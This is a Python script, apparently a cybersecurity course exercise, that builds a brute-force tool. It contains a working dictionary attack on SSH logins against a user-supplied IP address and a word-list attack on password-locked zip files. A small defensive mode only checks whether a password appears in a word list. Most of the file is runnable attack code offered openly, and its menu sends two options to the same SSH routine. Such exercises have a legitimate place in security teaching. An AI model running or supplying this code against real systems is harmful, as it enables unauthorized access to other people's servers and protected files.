#!/usr/bin/env python3 

# Script Name:                         automated_brute_force_tool3
# Author name:                         Hector Cordova
# Date of latest revision:             31JAN2024 
# Purpose:                             To create a automated brute force tool
# Execution:                           python3 
# Additional Resources:                https://www.howtoforge.com/how-to-protect-zip-file-with-password-on-ubuntu-1804/, https://docs.python.org/3/library/zipfile.html#module-zipfile, https://github.com/Hector2024/ops-401-code-challenges/blob/main/automated_brute_force_tool2.py, https://chat.openai.com/share/c2ff26fa-870d-44b5-a142-f5f0a87857cc

import time
import paramiko
import zipfile

def offensive_mode():
    word_list_path = input("Enter the path to the word list file: ")
    delay = float(input("Enter the delay between words: "))
    target_ip = input("Enter the target SSH server IP address: ")
    username = input("Enter the SSH username: ")

    # Open the word file and iterate through each line
    with open(word_list_path, 'r') as file:
        for line in file:
            password = line.strip()

            # Attempt SSH login with the current password
            ssh = paramiko.SSHClient()
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            try:
                ssh.connect(target_ip, username=username, password=password)
                print(f"Successful login! Username: {username}, Password: {password}")
                break  # Break out of the loop if login is successful
            except paramiko.AuthenticationException:
                print(f"Failed login attempt. Username: {username}, Password: {password}")
            finally:
                ssh.close()

            time.sleep(delay)

def defensive_mode():
    user_string = input("Enter a password to search: ")
    word_list_path = input("Enter the path to the word list file: ")

    with open(word_list_path, 'r') as file:
        word_list = [line.strip() for line in file]

    if user_string in word_list:
        print("The password is in the word list.")
    else:
        print("The password is not in the word list.")

def zip_bruteforce_mode():
    zip_file_path = input("Enter the path to the password-locked zip file: ")
    word_list_path = input("Enter the path to the word list file (e.g., RockYou.txt): ")

    # Open the word file and iterate through each line
    with open(word_list_path, 'r') as file:
        for line in file:
            password = line.strip()

            # Attempt to extract the zip file with the current password
            with zipfile.ZipFile(zip_file_path, 'r') as zip_file:
                try:
                    zip_file.extractall(pwd=password.encode('utf-8'))
                    print(f"Successful extraction! Password: {password}")
                    break  # Break out of the loop if extraction is successful
                except Exception as e:
                    print(f"Failed extraction attempt. Password: {password}, Error: {e}")

            time.sleep(0.1)  # Small delay between attempts

if __name__ == "__main__":
    print("Select mode:")
    print("1. Offensive; Dictionary Iterator")
    print("2. Defensive; Password Recognized")
    print("3. SSH Authentication Attempt")
    print("4. Zip File Brute Force")

    mode = input("Enter 1 for offensive mode, 2 for defensive mode, 3 for SSH authentication attempt, or 4 for Zip file brute force: ")

    if mode == '1':
        offensive_mode()
    elif mode == '2':
        defensive_mode()
    elif mode == '3':
        offensive_mode()  # Reusing the offensive_mode function for SSH authentication
    elif mode == '4':
        zip_bruteforce_mode()
    else:
        print("Please enter 1, 2, 3, or 4.")
